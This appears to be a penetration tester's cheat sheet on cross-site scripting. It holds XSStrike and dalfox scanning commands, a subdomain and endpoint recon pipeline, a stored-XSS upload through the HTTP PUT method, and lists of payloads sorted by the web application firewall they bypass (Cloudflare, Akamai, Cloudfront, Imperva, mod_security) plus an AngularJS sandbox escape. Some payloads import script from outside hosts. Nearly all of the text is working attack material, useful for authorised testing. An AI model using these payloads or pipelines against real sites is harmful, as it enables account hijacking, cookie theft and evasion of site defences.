# XSS Automation and testing notes

## case (1): Using xsstrike

```bash
python3 xsstrike.py -u "http://example.com/page?param=value"
python3 xsstrike.py -u "http://test.com/page?name=WillFuzzHereOnly&id=1" --params name
python3 xsstrike.py -u "http://test.com/login" --data "username=admin&password=123"
python3 xsstrike.py -u "http://test.com/search?q=test" --headers "User-Agent: XSStrikeBot, Authorization: Bearer test123"
python3 xsstrike.py -u "http://vulnerable.com/contact" --blind
python3 xsstrike.py -u "http://slowhost.com/page?input=123" --timeout 10
python3 xsstrike.py -u "http://target.com" --depth 3
```

**options:**
- `-u`: url to scan  
- `--params`: specify parameters to fuzz  
- `--data`: use post method and send data  
- `--headers`: add custom headers to each http request  
- `--blind`: test for blind xss  
- `--timeout`: set request timeout (waits up to 10 seconds)  
- `--depth`: set recursion depth for crawling  

---

## case (2): Recon and xss testing automation

```bash
# filter subdomains
httpx -l subs.txt -o httpx.txt
cat subs.txt | httprobe > httprobe.txt
cat subs.txt | httprobe -prefer-https | sort -u > httprobe.txt

# collect endpoints
echo "target.com" | gau --threads 5 > endpoints.txt
cat httpx.txt | katana -jc >> endpoints.txt
cat httpx.txt | waybackurls >> endpoints.txt

# filter unique urls
cat endpoints.txt | uro > unique_endpoints.txt

# extract xss-relevant urls
cat unique_endpoints.txt | gf xss > xss.txt

# find reflected xss
cat xss.txt | gxss -p khXSS -o reflected_xss.txt

# test reflected xss
dalfox file reflected_xss.txt -o vulnerable_xss.txt
```

**Notes:**
- `gxss` identifies reflected params by injecting and checking response
- `dalfox` is used for active testing and confirmation
- `uro` helps remove duplicated or similar urls
- `gf` filters urls by vulnerability patterns

---

## case (3): Exploiting put method to store xss

steps:
1. use `options` method to see allowed http methods  
2. find `put` allowed on endpoint `/file.html`  
3. upload using put with `content-type: application/octet-stream` and body like:
```html
<html><script>confirm()</script></html>
```
4. Visit the file and observe stored xss being executed

---

## Payloads for different web application firewalls

-------------------------------------------------------------------------
| angularjs | akamai | cloudfront | cloudflare | imperva | mod_security |
|-----------|--------|------------|------------|---------|--------------|

**XSS in email address:**
```
test+(<script>alert(1337)</script>)@example.com
test@example(<script>alert(1337)</script>).com
"<script>alert(1337)</script>@example.com
```

**XSS in phone number:**
```
+441134960000;phone-context=<script>alert(1337)</script>
```

**Regex filter bypass:**
```html
<script>top </script>
<img src="X" onerror=top >
```

**Angularjs 1.2.24-1.2.29:**
```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**Akamai:**
```html
';k='e'%0Atop //'"><A HRef=\" AutoFocus OnFocus=top/**/?. >
<A HRef=//site.com AutoFocas %26%2362 OnFocus%0C=import(href)>
```

**Cloudflare:**
```html
<svg/onload=window["al"+"ert"]`1337`>
<Img Src=OnXSS OnError=confirm(1337)>
<Svg Only=1 OnLoad=confirm(document.domain)>
<svg onload=alert&#0000000040document.cookie)>
<sVG/oNlY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
%3CSVG/oNLY=1%20ONlOAD=confirm(document.domain)%3E
<Img Src=//X55.is OnLoad%0C=import(Src)>
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
<A HRef=//site.com AutoFocas %26%2362 OnFocus%0C=import(href)>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
&lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
```

**Cloudfront:**
```html
">'><details/open/ontoggle=confirm('XSS')>
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E
';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(1337)//'>
```

**Mod_security:**
```html
<svg onload='new Function`["Y000!"].find(al\u0065rt)`'>
```

**Imperva:**
```html
<Img Src=//X55.is OnLoad%0C=import(Src)>
<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
<A HRef=//site.com AutoFocas %26%2362 OnFocus%0C=import(href)>
```
